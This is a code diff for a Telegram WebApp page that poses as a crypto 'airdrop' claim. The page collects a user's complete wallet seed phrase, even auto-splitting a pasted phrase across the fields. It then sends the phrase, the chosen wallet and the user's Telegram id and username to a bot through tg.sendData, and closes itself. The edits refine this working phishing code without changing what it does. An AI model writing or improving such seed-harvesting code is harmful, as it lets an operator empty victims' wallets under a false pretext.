@@ -20,7 +20,7 @@ document.addEventListener("DOMContentLoaded", () => {
             });
         })
         .catch(error => {
-            console.error("Ошибка при загрузке JSON:", error);
+            console.error("❌ Ошибка при загрузке JSON:", error);
             document.getElementById("airdropList").innerHTML =
                 "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
         });
@@ -29,7 +29,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const btn = document.getElementById('submitBtn');
     if (btn) btn.addEventListener('click', submitAirdrop);
 
-    // ======= Кастомний селектор гаманця (працює після DOMContentLoaded) =======
+    // ======= Кастомний селектор гаманця =======
     const selectWrapper = document.querySelector('.custom-select');
     if (selectWrapper) {
         const selected = selectWrapper.querySelector('.selected');
@@ -77,7 +77,7 @@ function renderSeedInputs() {
         container.appendChild(input);
     }
 
-    // Обробка вставки seed-фрази одразу у всі поля
+    // Обробка вставки seed-фрази
     const inputs = container.querySelectorAll('input');
     if (inputs.length > 0) {
         inputs[0].addEventListener('paste', (e) => {
@@ -100,44 +100,44 @@ function clearWarning() {
 }
 
 function submitAirdrop() {
-    // 🔐 Перевірка, що WebApp API Telegram доступний
-    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+    // 🔐 Перевірка Telegram WebApp
+    if (typeof Telegram === "undefined" || !Telegram.WebApp || !Telegram.WebApp.initDataUnsafe?.user) {
         alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
         return;
     }
 
-    // ✅ Ініціалізація WebApp
+    // ✅ Telegram WebApp готовий
     const tg = Telegram.WebApp;
     tg.ready();
 
-    // 🔎 Отримання seed-фраз
+    // 🧩 Seed-фраза
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
-    const words = inputs.map(input => input.value.trim()).filter(word => word !== '');
+    const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
-    // ⚠️ Перевірка на повне заповнення
+    // ❗️Перевірка
     if (words.length !== inputs.length) {
         const warning = document.getElementById('validationWarning');
-        warning.innerText = 'Пожалуйста, заполните все поля.';
+        warning.innerText = '❗️ Пожалуйста, заполните все поля.';
         warning.style.display = 'block';
         return;
     }
 
-    // 📦 Формування payload
+    // 📦 Payload
     const payload = {
         event: "airdrop_claim",
-        user_id: tg?.initDataUnsafe?.user?.id || "-",
-        username: tg?.initDataUnsafe?.user?.username || "-",
+        user_id: tg.initDataUnsafe.user.id || "-",
+        username: tg.initDataUnsafe.user.username || "-",
         timestamp: new Date().toISOString(),
         seed: words.join(" "),
         wallet: document.getElementById("wallet").value
     };
 
-    // 🧾 Вивід у консоль для дебагу
-    console.log("[📤 Отправка]", payload);
+    // 🔎 Консоль для дебагу
+    console.log("[📤 Отправка в Telegram WebApp]", payload);
 
-    // 🚀 Надсилання у Telegram-бот
+    // 🚀 Відправити в бот
     tg.sendData(JSON.stringify(payload));
 
-    // ❌ Закриття WebApp
+    // ✅ Закрити WebApp
     tg.close();
 }
